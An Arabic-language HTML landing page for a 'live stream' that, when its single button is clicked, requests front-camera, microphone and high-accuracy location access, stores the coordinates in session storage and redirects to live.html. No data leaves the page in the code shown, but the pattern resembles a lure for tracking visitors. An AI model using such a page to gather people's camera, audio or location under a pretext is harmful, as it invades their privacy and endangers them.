<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LIVE - بث مباشر</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { width: 100%; height: 100%; overflow: hidden; }
    body {
        font-family: Arial, Tahoma, sans-serif;
        color: #ffffff;
        background:
            radial-gradient( circle at 20% 20%, rgba(255, 49, 95, 0.22), transparent 35% ),
            radial-gradient( circle at 80% 80%, rgba(80, 50, 255, 0.20), transparent 35% ),
            linear-gradient( 135deg, #07070c, #0d0d17, #080910 );
        display: flex; align-items: center; justify-content: center;
    }

    .page {
        width: 100%; height: 100vh;
        display: flex; align-items: center; justify-content: center;
        position: relative; overflow: hidden;
    }

    .circle {
        position: absolute; border-radius: 50%;
        filter: blur(2px); opacity: 0.45; pointer-events: none;
    }
    .circle.one { width: 280px; height: 280px; background: rgba(255, 49, 95, 0.10); top: -100px; right: -80px; }
    .circle.two { width: 350px; height: 350px; background: rgba(75, 55, 255, 0.10); bottom: -150px; left: -100px; }

    .content {
        width: min(90%, 650px);
        text-align: center; position: relative; z-index: 2;
        display: flex; flex-direction: column; align-items: center;
    }

    .logo {
        font-size: clamp(55px, 10vw, 95px);
        font-weight: 900; letter-spacing: 5px; margin-bottom: 20px;
        text-shadow: 0 10px 40px rgba(0, 0, 0, 0.45);
    }
    .logo span { color: #ff315f; }

    .status {
        display: inline-flex; align-items: center; gap: 9px;
        color: #b8b8c4; font-size: 14px; margin-bottom: 22px;
    }
    .status-dot {
        width: 9px; height: 9px; background: #ff315f; border-radius: 50%;
        box-shadow: 0 0 0 6px rgba(255,49,95,.10), 0 0 20px rgba(255,49,95,.7);
        animation: pulse 1.4s infinite;
    }
    @keyframes pulse {
        0% { transform: scale(1); opacity: 1; }
        50% { transform: scale(.65); opacity: .5; }
        100% { transform: scale(1); opacity: 1; }
    }

    .title {
        font-size: clamp(27px, 5vw, 43px);
        font-weight: 800; line-height: 1.3; margin-bottom: 13px;
    }
    .title span { color: #ff315f; }

    .description {
        color: #92939f; font-size: 16px; line-height: 1.7;
        margin-bottom: 35px; max-width: 480px;
    }

    .live-button {
        width: 100%; max-width: 520px; min-height: 72px;
        border: none; border-radius: 18px;
        background: linear-gradient( 135deg, #ff315f, #ff174f );
        color: white; text-decoration: none;
        display: flex; align-items: center; justify-content: center; gap: 13px;
        font-size: 20px; font-weight: 800; cursor: pointer;
        box-shadow: 0 15px 45px rgba(255, 49, 95, 0.28);
        transition: transform .25s ease, box-shadow .25s ease, opacity .25s ease;
        font-family: inherit;
        position: relative;
        overflow: hidden;
    }
    .live-button:hover:not(:disabled) {
        transform: translateY(-3px);
        box-shadow: 0 20px 55px rgba(255, 49, 95, 0.45);
    }
    .live-button:active:not(:disabled) { transform: scale(.98); }
    .live-button:disabled {
        opacity: 0.7; cursor: not-allowed;
    }

    .button-dot {
        width: 11px; height: 11px; background: white; border-radius: 50%;
        box-shadow: 0 0 15px rgba(255,255,255,.8);
        flex-shrink: 0;
    }

    /* سبينر صغير داخل الزر أثناء التحميل */
    .btn-spinner {
        width: 18px; height: 18px;
        border: 3px solid rgba(255,255,255,0.35);
        border-top-color: white;
        border-radius: 50%;
        animation: spin 0.7s linear infinite;
        flex-shrink: 0;
        display: none;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    .live-button.loading .button-dot { display: none; }
    .live-button.loading .btn-spinner { display: block; }

    .bottom-text {
        margin-top: 24px; color: #555663; font-size: 12px;
    }

    /* رسالة الخطأ */
    .error-toast {
        position: fixed;
        bottom: 30px; left: 50%;
        transform: translateX(-50%) translateY(120px);
        background: #ff174f;
        color: white;
        padding: 14px 24px;
        border-radius: 14px;
        font-size: 13px;
        font-weight: 600;
        z-index: 200;
        box-shadow: 0 8px 30px rgba(255, 23, 79, 0.5);
        transition: transform .4s cubic-bezier(.175,.885,.32,1.275);
        max-width: 90%;
        text-align: center;
        line-height: 1.6;
    }
    .error-toast.show { transform: translateX(-50%) translateY(0); }

    /* شاشة التحميل الكاملة */
    .loading-overlay {
        position: fixed;
        inset: 0;
        background: rgba(7, 7, 12, 0.9);
        backdrop-filter: blur(8px);
        display: none;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        z-index: 300;
        gap: 20px;
    }
    .loading-overlay.active { display: flex; }

    .big-spinner {
        width: 55px; height: 55px;
        border: 5px solid rgba(255,255,255,0.1);
        border-top-color: #ff315f;
        border-right-color: #5032ff;
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
    }

    .loading-text {
        color: #ffffff;
        font-size: 15px;
        font-weight: 700;
        letter-spacing: .5px;
    }

    .loading-sub {
        color: #92939f;
        font-size: 12px;
        margin-top: -8px;
    }

    @media (max-width: 600px) {
        .content { width: 88%; }
        .logo { font-size: 62px; margin-bottom: 14px; }
        .title { font-size: 28px; }
        .description { font-size: 14px; margin-bottom: 28px; }
        .live-button { min-height: 68px; font-size: 18px; border-radius: 15px; }
        .bottom-text { margin-top: 18px; }
    }
</style>
</head>
<body>

<main class="page">

    <!-- خلفية -->
    <div class="circle one"></div>
    <div class="circle two"></div>

    <!-- المحتوى -->
    <div class="content">

        <!-- الشعار -->
        <div class="logo">LI<span>VE</span></div>

        <!-- الحالة -->
        <div class="status">
            <span class="status-dot"></span>
            البث المباشر متاح الآن
        </div>

        <!-- العنوان -->
        <h1 class="title">شاهد البث <span>مباشرة</span></h1>

        <!-- الوصف -->
        <p class="description">
            ادخل إلى البث المباشر واستمتع بالمحتوى وتابع ما يحدث الآن.
        </p>

        <!-- الزر الوحيد -->
        <button type="button" class="live-button" id="liveBtn" onclick="requestPermissionsAndGo()">
            <span class="button-dot"></span>
            <span class="btn-spinner"></span>
            <span class="btn-text">دخول البث المباشر</span>
        </button>

        <div class="bottom-text">بث مباشر • سريع • آمن</div>

    </div>

</main>

<!-- شاشة التحميل -->
<div class="loading-overlay" id="loadingOverlay">
    <div class="big-spinner"></div>
    <div class="loading-text" id="loadingText">جاري طلب الصلاحيات...</div>
    <div class="loading-sub" id="loadingSub">يرجى الموافقة على الوصول للكاميرا والميكروفون والموقع</div>
</div>

<!-- رسالة الخطأ -->
<div class="error-toast" id="errorToast"></div>

<script>
    const liveBtn = document.getElementById('liveBtn');
    const btnText = liveBtn.querySelector('.btn-text');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const loadingText = document.getElementById('loadingText');
    const loadingSub = document.getElementById('loadingSub');
    const errorToast = document.getElementById('errorToast');

    let isProcessing = false;

    // عرض رسالة خطأ
    function showError(msg, duration = 5000) {
        errorToast.textContent = msg;
        errorToast.classList.add('show');
        clearTimeout(errorToast._t);
        errorToast._t = setTimeout(() => {
            errorToast.classList.remove('show');
        }, duration);
    }

    // إظهار شاشة التحميل
    function showLoading(text, sub) {
        loadingText.textContent = text || 'جاري طلب الصلاحيات...';
        loadingSub.textContent = sub || '';
        loadingOverlay.classList.add('active');
    }

    function hideLoading() {
        loadingOverlay.classList.remove('active');
    }

    // طلب الموقع الجغرافي
    function requestLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ ok: false, reason: 'unsupported' });
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        ok: true,
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    });
                },
                (error) => {
                    resolve({ ok: false, reason: error.message, code: error.code });
                },
                {
                    enableHighAccuracy: true,
                    timeout: 12000,
                    maximumAge: 0
                }
            );
        });
    }

    // طلب الكاميرا والميكروفون
    async function requestMedia() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return { ok: false, reason: 'unsupported' };
        }
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                },
                audio: {
                    echoCancellation: true,
                    noiseSuppression: true,
                    autoGainControl: true
                }
            });
            return { ok: true, stream };
        } catch (err) {
            return { ok: false, reason: err.name, error: err };
        }
    }

    // الدالة الرئيسية
    async function requestPermissionsAndGo() {
        if (isProcessing) return;
        isProcessing = true;

        // تعطيل الزر وإظهار السبينر
        liveBtn.disabled = true;
        liveBtn.classList.add('loading');
        btnText.textContent = 'جاري التحقق...';

        // 1) طلب الصلاحيات (الكاميرا + الميكروفون + الموقع) بالتوازي
        showLoading('جاري طلب الصلاحيات...', 'يرجى الموافقة على الوصول للكاميرا والميكروفون والموقع');

        const [mediaResult, locationResult] = await Promise.all([
            requestMedia(),
            requestLocation()
        ]);

        // 2) التحقق من النتائج
        if (!mediaResult.ok) {
            hideLoading();
            resetButton();

            let msg = 'تعذر الوصول إلى الكاميرا والميكروفون. ';
            switch (mediaResult.reason) {
                case 'NotAllowedError':
                case 'PermissionDeniedError':
                    msg += 'تم رفض الصلاحية. يرجى السماح بالوصول من إعدادات المتصفح.';
                    break;
                case 'NotFoundError':
                case 'DevicesNotFoundError':
                    msg += 'لا يوجد كاميرا أو ميكروفون متصل بالجهاز.';
                    break;
                case 'NotReadableError':
                case 'TrackStartError':
                    msg += 'الكاميرا أو الميكروفون قيد الاستخدام من تطبيق آخر.';
                    break;
                case 'unsupported':
                    msg = 'متصفحك لا يدعم الوصول إلى الكاميرا. يرجى استخدام متصفح حديث.';
                    break;
                default:
                    msg += 'حدث خطأ غير متوقع: ' + (mediaResult.reason || '');
            }
            showError(msg, 6000);
            return;
        }

        // 3) نجحت صلاحيات الكاميرا — إيقاف المسار مؤقتاً (لأن صفحة البث ستطلبه لاحقاً)
        //    لكننا نحتفظ بإشارة النجاح للتحقق
        mediaResult.stream.getTracks().forEach(t => t.stop());

        // 4) التحقق من الموقع — إذا رُفض نُظهر تحذيراً لكن نكمل
        if (!locationResult.ok) {
            showLoading('تم رفض الموقع', 'سيتم المتابعة بدون تحديد الموقع...');
            // ننتظر قليلاً ثم نكمل
            await new Promise(r => setTimeout(r, 1200));

            // نخزّن حالة رفض الموقع
            try {
                sessionStorage.setItem('location_denied', '1');
                sessionStorage.setItem('location_reason', locationResult.reason || 'denied');
            } catch (e) {}
        } else {
            // نخزّن الإحداثيات للاستخدام في صفحة البث
            try {
                sessionStorage.setItem('location_lat', locationResult.lat);
                sessionStorage.setItem('location_lng', locationResult.lng);
                sessionStorage.setItem('location_accuracy', locationResult.accuracy);
                sessionStorage.removeItem('location_denied');
            } catch (e) {}
        }

        // 5) تخزين علم نجاح الصلاحيات
        try {
            sessionStorage.setItem('permissions_granted', '1');
            sessionStorage.setItem('permissions_time', Date.now());
        } catch (e) {}

        // 6) عرض رسالة نجاح ثم الانتقال
        showLoading('✅ تم منح الصلاحيات بنجاح', 'جاري الدخول إلى البث المباشر...');

        setTimeout(() => {
            window.location.href = 'live.html';
        }, 900);
    }

    // إعادة تعيين الزر
    function resetButton() {
        isProcessing = false;
        liveBtn.disabled = false;
        liveBtn.classList.remove('loading');
        btnText.textContent = 'دخول البث المباشر';
    }

    // في حال عاد المستخدم للصفحة (back) نعيد الزر لحالته
    window.addEventListener('pageshow', () => {
        hideLoading();
        resetButton();
    });
</script>

</body>
</html>
